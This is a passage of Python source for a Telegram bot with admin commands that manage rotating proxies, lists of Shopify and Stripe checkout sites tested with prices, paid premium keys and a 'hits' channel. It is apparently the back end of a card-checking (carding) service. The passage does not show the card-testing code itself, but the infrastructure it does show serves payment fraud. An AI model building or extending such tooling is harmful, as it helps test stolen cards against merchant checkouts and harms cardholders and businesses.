                await status_msg.edit(premium_emoji(f"❌ Dᴇᴀᴅ: <code>{proxy[:30]}...</code>\n\n📊 Aʟɪᴠᴇ: {len(alive_proxies)} | Dᴇᴀᴅ: {len(dead_proxies)}"), parse_mode='html')
            
            await asyncio.sleep(2)
        
        if alive_proxies:
            async with aiofiles.open(PROXY_FILE, 'a') as f:
                for proxy in alive_proxies:
                    await f.write(f"{proxy}\n")
        
        result_text = f"""✅ Pʀᴏxʏ Cʜᴇᴄᴋ & Aᴅᴅ Cᴏᴍᴘʟᴇᴛᴇ!

📊 Rᴇsᴜʟᴛs:
   ┣ ✅ Aʟɪᴠᴇ (Aᴅᴅᴇᴅ): {len(alive_proxies)}
   ┣ ❌ Dᴇᴀᴅ (Iɢɴᴏʀᴇᴅ): {len(dead_proxies)}
   ┣ ⚠️ Exɪsᴛɪɴɢ (Sᴋɪᴘᴘᴇᴅ): {len(already_exists)}
   ┗ 📁 Tᴏᴛᴀʟ ɪɴ ᴘʀᴏxʏ.ᴛxᴛ: {len(load_proxies())}"""
        
        await status_msg.edit(premium_emoji(result_text), parse_mode='html')
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        return
    
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ Pʀᴏxʏ Nᴏᴛ Fᴏᴜɴᴅ!"), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ {len(proxies)} ᴘʀᴏxɪᴇs..."), parse_mode='html')
    
    alive_proxies = []
    dead_proxies = []
    batch_size = 50
    
    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])
            
            await status_msg.edit(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ ᴘʀᴏxɪᴇs...\n\nCʜᴇᴄᴋᴇᴅ: {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\nAʟɪᴠᴇ: {len(alive_proxies)}\nDᴇᴀᴅ: {len(dead_proxies)}"), parse_mode='html')
        
        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")
        
        await status_msg.edit(premium_emoji(f"✅ Pʀᴏxʏ Cʜᴇᴄᴋ Cᴏᴍᴘʟᴇᴛᴇ!\n\nTᴏᴛᴀʟ: {len(proxies)}\nAʟɪᴠᴇ: {len(alive_proxies)}\nRᴇᴍᴏᴠᴇᴅ: {len(dead_proxies)}"), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usᴀɢᴇ: <code>/chkproxy ɪᴘ:ᴘᴏʀᴛ:ᴜsᴇʀ:ᴘᴀss</code>"), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ ᴘʀᴏxʏ: <code>{proxy}</code>..."), parse_mode='html')
    try:
        result = await test_proxy(proxy)
        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ Pʀᴏxʏ ɪs ALIVE!\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ Pʀᴏxʏ ɪs DEAD!\n\n<code>{proxy}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usᴀɢᴇ: <code>/rmproxy ɪᴘ:ᴘᴏʀᴛ:ᴜsᴇʀ:ᴘᴀss</code>"), parse_mode='html')
        return
    current_proxies = load_proxies()
    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Pʀᴏxʏ ɴᴏᴛ ғᴏᴜɴᴅ: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    await event.reply(premium_emoji(f"✅ Pʀᴏxʏ ʀᴇᴍᴏᴠᴇᴅ!\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usᴀɢᴇ: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return
    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ɪɴᴅɪᴄᴇs. Usᴇ ɴᴜᴍʙᴇʀs sᴇᴘᴀʀᴀᴛᴇᴅ ʙʏ ᴄᴏᴍᴍᴀs."), parse_mode='html')
        return
    current_proxies = load_proxies()
    if not current_proxies:
        await event.reply(premium_emoji("❌ Nᴏ ᴘʀᴏxɪᴇs ɪɴ ᴘʀᴏxʏ.ᴛxᴛ"), parse_mode='html')
        return
    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)
    if not removed:
        await event.reply(premium_emoji("❌ Nᴏ ᴠᴀʟɪᴅ ɪɴᴅɪᴄᴇs ғᴏᴜɴᴅ."), parse_mode='html')
        return
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    removed_text = "\n".join(removed[:10])
    await event.reply(premium_emoji(f"✅ Rᴇᴍᴏᴠᴇᴅ {len(removed)} ᴘʀᴏxɪᴇs!\n\nRᴇᴍᴏᴠᴇᴅ:\n<code>{removed_text}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_all_proxies(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    current_proxies = load_proxies()
    count = len(current_proxies)
    if count == 0:
        await event.reply(premium_emoji("❌ ᴘʀᴏxʏ.ᴛxᴛ ɪs ᴀʟʀᴇᴀᴅʏ ᴇᴍᴘᴛʏ."), parse_mode='html')
        return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"
    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")
        await event.reply(premium_emoji(f"📦 Bᴀᴄᴋᴜᴘ ᴄʀᴇᴀᴛᴇᴅ!\n\nSᴇɴᴅɪɴɢ ʙᴀᴄᴋᴜᴘ ᴏғ {count} ᴘʀᴏxɪᴇs..."), file=backup_filename, parse_mode='html')
        try:
            os.remove(backup_filename)
        except:
            pass
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ ᴄʀᴇᴀᴛɪɴɢ ʙᴀᴄᴋᴜᴘ: {e}"), parse_mode='html')
        return
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")
    await event.reply(premium_emoji(f"✅ Cʟᴇᴀʀᴇᴅ ᴀʟʟ {count} ᴘʀᴏxɪᴇs!\n\nᴘʀᴏxʏ.ᴛxᴛ ɪs ɴᴏᴡ ᴇᴍᴘᴛʏ."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_all_proxies(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    current_proxies = load_proxies()
    if not current_proxies:
        await event.reply(premium_emoji("❌ Nᴏ ᴘʀᴏxɪᴇs ɪɴ ᴘʀᴏxʏ.ᴛxᴛ"), parse_mode='html')
        return
    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"📋 Aʟʟ Pʀᴏxɪᴇs ({len(current_proxies)}):\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")
        await event.reply(premium_emoji(f"📋 Aʟʟ Pʀᴏxɪᴇs ({len(current_proxies)}):\n\nFɪʟᴇ ᴀᴛᴛᴀᴄʜᴇᴅ ʙᴇʟᴏᴡ."), file=filename, parse_mode='html')
        try:
            os.remove(filename)
        except:
            pass
          
@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ sɪᴛᴇs.ᴛxᴛ ɪs ᴇᴍᴘᴛʏ."), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ Nᴏ ᴘʀᴏxɪᴇs ᴀᴠᴀɪʟᴀʙʟᴇ!\n\n⚠️ Pʟᴇᴀsᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ᴛᴏ ᴀᴅᴅ ᴘʀᴏxɪᴇsᴇ."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ {len(sites)} sɪᴛᴇs..."), parse_mode='html')
    alive_sites = []
    dead_sites = []
    sites_with_price = []
    batch_size = 10
    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies:
                fresh_proxies = proxies
            tasks = [test_site_with_price(site, random.choice(fresh_proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                    sites_with_price.append({'url': res['site'], 'price': res.get('price', 0.0)})
                else:
                    dead_sites.append(res['site'])
            await status_msg.edit(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ sɪᴛᴇs...\n\nCʜᴇᴄᴋᴇᴅ: {len(alive_sites) + len(dead_sites)}/{len(sites)}\nAʟɪᴠᴇ: {len(alive_sites)}\nDᴇᴀᴅ: {len(dead_sites)}"), parse_mode='html')
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
        await save_sites_with_price(sites_with_price)
        await status_msg.edit(premium_emoji(f"✅ Sɪᴛᴇ ᴄʜᴇᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇ!\n\nTᴏᴛᴀʟ: {len(sites)}\nAʟɪᴠᴇ: {len(alive_sites)}\nRᴇᴍᴏᴠᴇᴅ: {len(dead_sites)}"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/rm\s+'))
async def remove_site_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    try:
        url_to_remove = event.message.text.split(' ', 1)[1].strip()
        if not url_to_remove:
            await event.reply(premium_emoji("❌ Usᴀɢᴇ: <code>/rm ʜᴛᴛᴘs://sɪᴛᴇ.ᴄᴏᴍ</code>"), parse_mode='html')
            return
        current_sites = load_sites()
        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f"❌ Sɪᴛᴇ ɴᴏᴛ ғᴏᴜɴᴅ: <code>{url_to_remove}</code>"), parse_mode='html')
            return
        new_sites = [site for site in current_sites if site != url_to_remove]
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")
        await event.reply(premium_emoji(f"✅ Sɪᴛᴇ ʀᴇᴍᴏᴠᴇᴅ!\n\n<code>{url_to_remove}</code>"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addsites'))
async def add_sites_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("📝 Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ:\n<code>/addsites</code>"), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("🔄 Pʀᴏᴄᴇssɪɴɢ sɪᴛᴇs ғɪʟᴇ..."), parse_mode='html')
    try:
        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
            sites = [line.strip() for line in content.splitlines() if line.strip()]
        os.remove(file_path)
        if not sites:
            await status_msg.edit(premium_emoji("❌ Nᴏ ᴠᴀʟɪᴅ sɪᴛᴇs ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ."), parse_mode='html')
            return
        await status_msg.edit(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ {len(sites)} sɪᴛᴇs ʙᴇғᴏʀᴇ ᴀᴅᴅɪɴɢ..."), parse_mode='html')
        proxies = load_proxies()
        if not proxies:
            await status_msg.edit(premium_emoji("❌ Nᴏ ᴘʀᴏxɪᴇs ᴀᴠᴀɪʟᴀʙʟᴇ ᴛᴏ ᴛᴇsᴛ sɪᴛᴇs."), parse_mode='html')
            return
        alive_sites = []
        dead_sites = []
        sites_with_price = []
        batch_size = 10
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            tasks = [test_site_with_price(site, random.choice(proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                    sites_with_price.append({'url': res['site'], 'price': res.get('price', 0.0)})
                else:
                    dead_sites.append(res['site'])
            await status_msg.edit(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ sɪᴛᴇs...\n\nCʜᴇᴄᴋᴇᴅ: {len(alive_sites) + len(dead_sites)}/{len(sites)}\n✅ Aʟɪᴠᴇ: {len(alive_sites)}\n❌ Dᴇᴀᴅ: {len(dead_sites)}"), parse_mode='html')
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
        await save_sites_with_price(sites_with_price)
        result_text = f"""✅ <b>Sɪᴛᴇs ᴜᴘᴅᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!</b>

📊 Tᴏᴛᴀʟ sɪᴛᴇs ʀᴇᴄᴇɪᴠᴇᴅ: {len(sites)}
✅ Aʟɪᴠᴇ (ᴀᴅᴅᴇᴅ): {len(alive_sites)}
❌ Dᴇᴀᴅ (ɪɢɴᴏʀᴇᴅ): {len(dead_sites)}

🌐 <b>Aᴅᴅᴇᴅ sɪᴛᴇs:</b>
{chr(10).join([f"• {s}" for s in alive_sites[:5]])}{'...' if len(alive_sites) > 5 else ''}"""
        await status_msg.edit(premium_emoji(result_text), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

# ===================== STRIPE SITES MANAGEMENT =====================
@bot.on(events.NewMessage(pattern='/addstripe'))
async def add_stripe_sites(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("📝 Reply to a .txt file with Stripe sites\n\nUsage: /addstripe (reply to .txt)"), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file"), parse_mode='html')
        return
    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    sites = [line.strip() for line in content.splitlines() if line.strip()]
    os.remove(file_path)
    if not sites:
        await event.reply(premium_emoji("❌ No valid sites found"), parse_mode='html')
        return
    # Load existing and add new
    existing = load_stripe_sites()
    added = 0
    for site in sites:
        if site not in existing:
            existing.append(site)
            added += 1
    async with aiofiles.open(STRIPE_SITES_FILE, 'w') as f:
        for s in existing:
            await f.write(f"{s}\n")
    await event.reply(premium_emoji(f"✅ Added {added} Stripe sites!\n📊 Total: {len(existing)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmsite'))
async def rm_stripe_site(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: /rmsite <url>"), parse_mode='html')
        return
    site = args[1].strip()
    sites = load_stripe_sites()
    if site in sites:
        sites.remove(site)
        async with aiofiles.open(STRIPE_SITES_FILE, 'w') as f:
            for s in sites:
                await f.write(f"{s}\n")
        await event.reply(premium_emoji(f"✅ Removed: {site}"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"❌ Site not found: {site}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/mysites'))
async def list_stripe_sites(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    sites = load_stripe_sites()
    shopify_sites = load_sites()
    if not sites and not shopify_sites:
        await event.reply(premium_emoji("📭 No sites added yet."), parse_mode='html')
        return
    text = ""
    if shopify_sites:
        text += f"<b>🛍️ Shopify Sites ({len(shopify_sites)}):</b>\n"
        for s in shopify_sites[:10]:
            text += f"  • {s}\n"
        if len(shopify_sites) > 10:
            text += f"  ... +{len(shopify_sites)-10} more\n"
    if sites:
        text += f"\n<b>👑 Stripe Sites ({len(sites)}):</b>\n"
        for s in sites[:10]:
            text += f"  • {s}\n"
        if len(sites) > 10:
            text += f"  ... +{len(sites)-10} more\n"
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    try:
        parts = event.raw_text.split()
        if len(parts) < 2:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/addpremium ᴜsᴇʀ_ɪᴅ [ʜᴏᴜʀs]</code>\n\n💡 If no hours = permanent"), parse_mode='html')
            return
        target_id = int(parts[1])
        hours = int(parts[2]) if len(parts) > 2 else None
        if await add_premium_user(target_id, hours=hours, added_by=user_id):
            duration = f"for {hours} hours" if hours else "permanent"
            await event.reply(premium_emoji(f"✅ Usᴇʀ <code>{target_id}</code> ᴀᴅᴅᴇᴅ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ({duration})!"), parse_mode='html')
            try:
                await bot.send_message(target_id, premium_emoji(f"🎉 Yᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ɢʀᴀɴᴛᴇᴅ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ({duration})!"), parse_mode='html')
            except:
                pass
        else:
            await event.reply(premium_emoji(f"⚠️ Usᴇʀ <code>{target_id}</code> ɪs ᴀʟʀᴇᴀᴅʏ ᴘʀᴇᴍɪᴜᴍ."), parse_mode='html')
    except ValueError:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ᴜsᴇʀ ID or hours."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/removepremium'))
async def remove_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/removepremium ᴜsᴇʀ_ɪᴅ</code>"), parse_mode='html')
            return
        target_id = int(parts[1])
        if target_id in ADMIN_ID:
            await event.reply(premium_emoji("⚠️ Cᴀɴɴᴏᴛ ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴ ғʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ."), parse_mode='html')
            return
        if await remove_premium_user(target_id):
            await event.reply(premium_emoji(f"✅ Usᴇʀ <code>{target_id}</code> ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ."), parse_mode='html')
            try:
                await bot.send_message(target_id, premium_emoji("⚠️ Yᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ʜᴀs ʙᴇᴇɴ ʀᴇᴠᴏᴋᴇᴅ."), parse_mode='html')
            except:
                pass
        else:
            await event.reply(premium_emoji(f"⚠️ Usᴇʀ <code>{target_id}</code> ɪs ɴᴏᴛ ᴘʀᴇᴍɪᴜᴍ."), parse_mode='html')
    except ValueError:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ᴜsᴇʀ ID."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/genkeys'))
async def genkeys_command(event):
    if event.sender_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 4:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/genkeys ᴀᴍᴏᴜɴᴛ ʜᴏᴜʀs ᴜsᴇʀ_ʟɪᴍɪᴛ</code>"), parse_mode='html')
            return
        amount = int(parts[1])
        hours = int(parts[2])
        user_limit = int(parts[3])
        keys_data = await load_keys()
        generated_keys = []
        created_at = datetime.now()
        for _ in range(amount):
            key = generate_key()
            expiry_time = created_at + timedelta(hours=hours)
            keys_data[key] = {
                'type': 'time_limit',
                'hours': hours,
                'expiry': expiry_time.isoformat(),
                'user_limit': user_limit,
                'used_count': 0,
                'used_by': [],
                'created_at': created_at.isoformat(),
                'created_by': event.sender_id
            }
            generated_keys.append(key)
        await save_keys(keys_data)
        days_display = f"{hours} hours" if hours < 24 else f"{hours // 24} days"
        keys_text = ""
        for idx, key in enumerate(generated_keys, 1):
            keys_text += f"""
┣ <code>{key}</code>"""
        await event.reply(premium_emoji(f"""⭐ <b>Kᴇʏs Gᴇɴᴇʀᴀᴛᴇᴅ</b>   (x{amount})   
━━━━━━━━━━━━━━━━━━
    {keys_text}
┗ 📅 Pᴇʀɪᴏᴅ: {days_display}
           ┗ 👥 Usᴇʀs: {user_limit}
      
✅ Usᴇ <code>/redeem Kᴇʏ</code> ᴛᴏ ʀᴇᴅᴇᴇᴍ"""), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    user_id = event.sender_id
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/redeem Kᴇʏ</code>"), parse_mode='html')
            return
        key = parts[1].upper()
        keys_data = await load_keys()
        if key not in keys_data:
            await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ Kᴇʏ!"), parse_mode='html')
            return
        key_data = keys_data[key]
        if key_data.get('type') == 'time_limit':
            expiry = datetime.fromisoformat(key_data['expiry'])
            current_date = datetime.now()
            if current_date > expiry:
                await event.reply(premium_emoji("❌ Tʜɪs ᴋᴇʏ ʜᴀs EXPIRED!"), parse_mode='html')
                return
            if key_data['used_count'] >= key_data['user_limit']:
                await event.reply(premium_emoji(f"❌ Tʜɪs ᴋᴇʏ ʜᴀs ʀᴇᴀᴄʜᴇᴅ ɪᴛs ʟɪᴍɪᴛ"), parse_mode='html')
                return
            user_id_str = str(user_id)
            if user_id_str in key_data['used_by']:
                await event.reply(premium_emoji("❌ Yᴏᴜ ʜᴀᴠᴇ ᴀʟʀᴇᴀᴅʏ ᴜsᴇᴅ ᴛʜɪs ᴋᴇʏ!"), parse_mode='html')
                return
            if is_premium(user_id):
                await event.reply(premium_emoji("❌ Yᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss!"), parse_mode='html')
                return
            await add_premium_user(user_id, hours=key_data['hours'], added_by='key')
            key_data['used_count'] += 1
            key_data['used_by'].append(user_id_str)
            key_data['used_at'] = current_date.isoformat()
            keys_data[key] = key_data
            await save_keys(keys_data)
            hours_display = key_data['hours']
            days_display = f"{hours_display} hours" if hours_display < 24 else f"{hours_display // 24} days"
            
            # Notify user
            await event.reply(premium_emoji(f"""🎉 Cᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴs!
⭐ Vɪᴘ Aᴄᴄᴇss Aᴄᴛɪᴠᴀᴛᴇᴅ! 📅 Dᴜʀᴀᴛɪᴏɴ: {days_display}
"""), parse_mode='html')
            
            # Notify admin channel
            try:
                sender = await event.get_sender()
                username = f"@{sender.username}" if sender.username else sender.first_name or "Unknown"
                admin_msg = f"""🔔 <b>Kᴇʏ Rᴇᴅᴇᴇᴍᴇᴅ</b>

🔑 Kᴇʏ: <code>{key}</code>
👤 Usᴇʀ: <code>{user_id}</code> | {username}
⏰ Dᴜʀᴀᴛɪᴏɴ: {days_display}
📅 Eɴᴅs: {(current_date + timedelta(hours=hours_display)).strftime('%Y-%m-%d %H:%M')}"""
                print(f'[*] Sending admin notification to {HITS_CHANNEL_ID}')
                await bot.send_message(HITS_CHANNEL_ID, premium_emoji(admin_msg), parse_mode='html')
                print(f'[+] Admin notification sent!')
            except Exception as e:
                print(f'[-] Admin notification error: {e}')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/listpremium'))
async def list_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    data = load_premium_data()
    now = datetime.now()
    if not data:
        await event.reply(premium_emoji("📭 Nᴏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ғᴏᴜɴᴅ."), parse_mode='html')
        return
    
    premium_list = ""
    for uid, info in data.items():
        try:
            u = await bot.get_entity(int(uid))
            username = f"@{u.username}" if u.username else u.first_name or "Unknown"
        except:
            username = "Unknown"
        
        expiry = info.get('expiry')
        if not expiry:
            time_left = "♾️ Pᴇʀᴍᴀɴᴇɴᴛ"
        else:
            exp_dt = datetime.fromisoformat(expiry)
            if exp_dt < now:
                time_left = "❌ EXPIRED"
            else:
                diff = exp_dt - now
                hours = int(diff.total_seconds() // 3600)
                mins = int((diff.total_seconds() % 3600) // 60)
                time_left = f"⏰ {hours}h {mins}m"
        
        is_admin = "👑" if int(uid) in ADMIN_ID else ""
        premium_list += f"\n{is_admin} <code>{uid}</code> | {username}\n   └ {time_left}\n"
    
    buttons = []
    for uid in data.keys():
        if int(uid) not in ADMIN_ID:
            buttons.append([Button.inline(f"❌ Revoke {uid}", f"revoke_premium:{uid}".encode(), style="danger")])
    
    await event.reply(premium_emoji(f"👑 <b>Pʀᴇᴍɪᴜᴍ Usᴇʀs ({len(data)})</b>\n{premium_list}"), buttons=buttons if buttons else None, parse_mode='html')

@bot.on(events.CallbackQuery(data=re.compile(r"revoke_premium:(\d+)")))
async def revoke_premium_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("⛔ Admin only!", alert=True)
        return
    
    target_id = int(event.pattern_match.group(1))
    if target_id in ADMIN_ID:
        await event.answer("⚠️ Cannot revoke admin!", alert=True)
        return
    
    if await remove_premium_user(target_id):
        await event.answer(f"✅ Revoked {target_id}", alert=False)
        try:
            await bot.send_message(target_id, premium_emoji("⚠️ Yᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ʜᴀs ʙᴇᴇɴ ʀᴇᴠᴏᴋᴇᴅ."), parse_mode='html')
        except:
            pass
    else:
        await event.answer("❌ User not found", alert=True)

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    premium_users = load_premium_users()
    sites = load_sites()
    proxies = load_proxies()
    stats_text = f"""📊 <b>Bᴏᴛ Sᴛᴀᴛɪsᴛɪᴄs</b>

👑 <b>Aᴅᴍɪɴs:</b> {len(ADMIN_ID)}
💎 <b>Pʀᴇᴍɪᴜᴍ Usᴇʀs:</b> {len(premium_users)}
🌐 <b>Sɪᴛᴇs:</b> {len(sites)}
🔌 <b>Pʀᴏxɪᴇs:</b> {len(proxies)}

🤖 <b>Bᴏᴛ Sᴛᴀᴛᴜs:</b> Rᴜɴɴɪɴɢ ✅"""
    await event.reply(premium_emoji(stats_text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/sethits'))
